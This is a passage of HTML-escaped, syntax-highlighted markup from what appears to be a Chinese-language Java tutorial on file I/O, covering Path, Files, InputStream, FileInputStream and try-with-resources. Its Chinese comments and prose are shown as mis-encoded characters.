&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Path&lt;/span> &lt;span style="color:#111">p1&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Paths&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;.&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;project&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;study&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// æž„é€ ä¸€ä¸ªPathå¯¹è±¡
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">p1&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Path&lt;/span> &lt;span style="color:#111">p2&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">p1&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">toAbsolutePath&lt;/span>&lt;span style="color:#f92672">();&lt;/span> &lt;span style="color:#75715e">// è½¬æ¢ä¸ºç»å¯¹è·¯å¾„
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">p2&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Path&lt;/span> &lt;span style="color:#111">p3&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">p2&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">normalize&lt;/span>&lt;span style="color:#f92672">();&lt;/span> &lt;span style="color:#75715e">// è½¬æ¢ä¸ºè§„èŒƒè·¯å¾„
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">p3&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">File&lt;/span> &lt;span style="color:#111">f&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">p3&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">toFile&lt;/span>&lt;span style="color:#f92672">();&lt;/span> &lt;span style="color:#75715e">// è½¬æ¢ä¸ºFileå¯¹è±¡
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">f&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Path&lt;/span> &lt;span style="color:#111">p&lt;/span> &lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#111">Paths&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;..&amp;#34;&lt;/span>&lt;span style="color:#f92672">).&lt;/span>&lt;span style="color:#75af00">toAbsolutePath&lt;/span>&lt;span style="color:#f92672">())&lt;/span> &lt;span style="color:#f92672">{&lt;/span> &lt;span style="color:#75715e">// å¯ä»¥ç›´æŽ¥éåŽ†Path
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34; &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">p&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="filespaths">Files&amp;amp;Paths&lt;/h3>
&lt;p>æ˜¯&lt;code>java.nio&lt;/code>åŒ…é‡Œé¢çš„ç±»ï¼Œå°è£…äº†å¾ˆå¤šè¯»å†™æ–‡ä»¶çš„ç®€å•æ–¹æ³•&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// æŠŠä¸€ä¸ªæ–‡ä»¶çš„å…¨éƒ¨å†…å®¹è¯»å–ä¸ºä¸€ä¸ªbyte[]
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Files&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">readAllBytes&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Paths&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;/path/to/file.txt&amp;#34;&lt;/span>&lt;span style="color:#f92672">));&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// æŠŠä¸€ä¸ªæ–‡ä»¶çš„å…¨éƒ¨å†…å®¹è¯»å–ä¸ºString
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// é»˜è®¤ä½¿ç”¨UTF-8ç¼–ç è¯»å–:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">content1&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Files&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">readString&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Paths&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;/path/to/file.txt&amp;#34;&lt;/span>&lt;span style="color:#f92672">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// å¯æŒ‡å®šç¼–ç :
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">content2&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Files&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">readString&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Paths&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;/path/to/file.txt&amp;#34;&lt;/span>&lt;span style="color:#f92672">),&lt;/span> &lt;span style="color:#111">StandardCharsets&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">ISO_8859_1&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// æŒ‰è¡Œè¯»å–å¹¶è¿”å›žæ¯è¡Œå†…å®¹:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">List&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#111">lines&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Files&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">readAllLines&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Paths&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;/path/to/file.txt&amp;#34;&lt;/span>&lt;span style="color:#f92672">));&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// å†™å…¥æ–‡ä»¶
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// å†™å…¥äºŒè¿›åˆ¶æ–‡ä»¶:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">...&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Files&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">write&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Paths&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;/path/to/file.txt&amp;#34;&lt;/span>&lt;span style="color:#f92672">),&lt;/span> &lt;span style="color:#111">data&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// å†™å…¥æ–‡æœ¬å¹¶æŒ‡å®šç¼–ç :
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">Files&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">writeString&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Paths&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;/path/to/file.txt&amp;#34;&lt;/span>&lt;span style="color:#f92672">),&lt;/span> &lt;span style="color:#d88200">&amp;#34;æ–‡æœ¬å†…å®¹...&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">StandardCharsets&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">ISO_8859_1&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// æŒ‰è¡Œå†™å…¥æ–‡æœ¬:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">List&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#111">lines&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">...&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Files&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">write&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Paths&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;/path/to/file.txt&amp;#34;&lt;/span>&lt;span style="color:#f92672">),&lt;/span> &lt;span style="color:#111">lines&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>æ³¨æ„ï¼Œ&lt;code>Files&lt;/code>æä¾›çš„è¯»å†™æ–¹æ³•ï¼Œå—å†…å­˜é™åˆ¶ï¼Œåªèƒ½è¯»å†™å°æ–‡ä»¶ï¼Œä¾‹å¦‚é…ç½®æ–‡ä»¶ç­‰ï¼Œä¸å¯ä¸€æ¬¡è¯»å…¥å‡ ä¸ªGçš„å¤§æ–‡ä»¶ã€‚è¯»å†™å¤§åž‹æ–‡ä»¶ä»ç„¶è¦ä½¿ç”¨æ–‡ä»¶æµï¼Œæ¯æ¬¡åªè¯»å†™ä¸€éƒ¨åˆ†æ–‡ä»¶å†…å®¹&lt;/p>
&lt;h3 id="å­—èŠ‚æµè¯»å†™">å­—èŠ‚æµè¯»å†™&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>&lt;code>InputStream&lt;/code>ä»£è¡¨è¾“å…¥å­—èŠ‚æµï¼Œ&lt;code>OuputStream&lt;/code>ä»£è¡¨è¾“å‡ºå­—èŠ‚æµï¼Œä»¥byteä¸ºæœ€å°å•ä½&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>Reader&lt;/code>å’Œ&lt;code>Writer&lt;/code>è¡¨ç¤ºå­—ç¬¦æµ(è¯»å†™å­—ç¬¦ï¼Œå¹¶ä¸”å­—ç¬¦ä¸å…¨æ˜¯å•å­—èŠ‚è¡¨ç¤ºçš„ASCIIå­—ç¬¦)ï¼Œä»¥charä¸ºæœ€å°å•ä½&lt;/p>
&lt;/li>
&lt;li>
&lt;p>å¦‚æžœæ•°æ®æºä¸æ˜¯æ–‡æœ¬ï¼Œå°±åªèƒ½ä½¿ç”¨&lt;code>InputStream&lt;/code>ï¼Œå¦‚æžœæ•°æ®æºæ˜¯æ–‡æœ¬ï¼Œä½¿ç”¨Readeræ›´æ–¹ä¾¿ä¸€äº›&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>InputStream&lt;/code>å¹¶ä¸æ˜¯ä¸€ä¸ªæŽ¥å£ï¼Œè€Œæ˜¯ä¸€ä¸ªæŠ½è±¡ç±»ï¼Œå®ƒæ˜¯æ‰€æœ‰è¾“å…¥æµçš„è¶…ç±»ï¼Œè¿™ä¸ªæŠ½è±¡ç±»å®šä¹‰çš„ä¸€ä¸ªæœ€é‡è¦çš„æ–¹æ³•å°±æ˜¯&lt;code>int read()&lt;/code>&lt;/p>
&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">abstract&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#75af00">read&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">IOException&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>è¿™ä¸ªæ–¹æ³•ä¼šè¯»å–è¾“å…¥æµçš„ä¸‹ä¸€ä¸ªå­—èŠ‚ï¼Œå¹¶è¿”å›žå­—èŠ‚è¡¨ç¤ºçš„&lt;code>int&lt;/code>å€¼ï¼ˆ0~255ï¼‰ï¼Œå¦‚æžœå·²è¯»åˆ°æœ«å°¾ï¼Œè¿”å›ž&lt;code>-1&lt;/code>è¡¨ç¤ºä¸èƒ½ç»§ç»­è¯»å–äº†&lt;/p>
&lt;ul>
&lt;li>&lt;code>FileInputStream&lt;/code>æ˜¯&lt;code>InputStream&lt;/code>çš„ä¸€ä¸ªå­ç±»ï¼Œä»Žæ–‡ä»¶æµä¸­è¯»å–æ•°æ®&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">readFile&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">IOException&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">InputStream&lt;/span> &lt;span style="color:#111">input&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">FileInputStream&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;src/readme.md&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">for&lt;/span>&lt;span style="color:#f92672">(;;){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">n&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">input&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">read&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">n&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#111">1&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">break&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">n&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">input&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">close&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>æ‰€æœ‰ä¸ŽIOæ“ä½œç›¸å…³çš„ä»£ç éƒ½å¿…é¡»æ­£ç¡®å¤„ç†&lt;code>IOException&lt;/code>ï¼Œå¯ä»¥ç”¨&lt;code>try ... finally&lt;/code>æ¥ä¿è¯&lt;code>InputStream&lt;/code>åœ¨æ— è®ºæ˜¯å¦å‘ç”ŸIOé”™è¯¯çš„æ—¶å€™éƒ½èƒ½å¤Ÿæ­£ç¡®åœ°å…³é—­&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">readFile&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">IOException&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">InputStream&lt;/span> &lt;span style="color:#111">input&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">input&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">FileInputStream&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;src/readme.txt&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">n&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">while&lt;/span>&lt;span style="color:#f92672">((&lt;/span>&lt;span style="color:#111">n&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">input&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">read&lt;/span>&lt;span style="color:#f92672">())!=-&lt;/span>&lt;span style="color:#111">1&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">prinln&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">n&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>&lt;span style="color:#00a8c8">finally&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">input&lt;/span>&lt;span style="color:#f92672">!=&lt;/span>&lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">input&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">close&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>java7ä¹‹åŽå¯ä»¥ç”¨æ›´ç®€å•çš„try(resource)&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">readFile&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">IOException&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">InputStream&lt;/span> &lt;span style="color:#111">input&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">FileInputStream&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;src/readme.txt&amp;#34;&lt;/span>&lt;span style="color:#f92672">))&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">n&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">while&lt;/span> &lt;span style="color:#f92672">((&lt;/span>&lt;span style="color:#111">n&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">input&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">read&lt;/span>&lt;span style="color:#f92672">())&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#111">1&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">n&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#75715e">// ç¼–è¯‘å™¨åœ¨æ­¤è‡ªåŠ¨ä¸ºæˆ‘ä»¬å†™å…¥finallyå¹¶è°ƒç”¨close()
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#f92672">}&lt;/span>
